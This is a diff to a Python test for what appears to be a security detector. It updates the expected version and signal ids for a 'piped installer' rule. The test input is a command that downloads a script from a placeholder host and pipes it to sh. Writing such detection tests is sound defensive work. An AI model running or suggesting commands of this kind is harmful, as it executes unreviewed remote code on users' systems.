@@ -27,9 +27,9 @@ def test_file_routing_matches_observed_shell_behavior(tmp_path):
 
 def test_changed_methods_have_new_versions():
     result = evaluator.signals(evaluator.Doc(text='curl https://example.test/i | sh'))
-    assert result['calibration_id'] == 'uncalibrated-rules-v5'
-    assert result['models'][0]['revision'] == 'context-v5'
-    assert result['candidates'][0]['signals'][0]['id'] == 'sig.piped_installer.v3'
+    assert result['calibration_id'] == 'uncalibrated-rules-v6'
+    assert result['models'][0]['revision'] == 'context-v6'
+    assert result['candidates'][0]['signals'][0]['id'] == 'sig.piped_installer.v4'
 
 
 @pytest.mark.parametrize('row', [json.loads(line) for line in
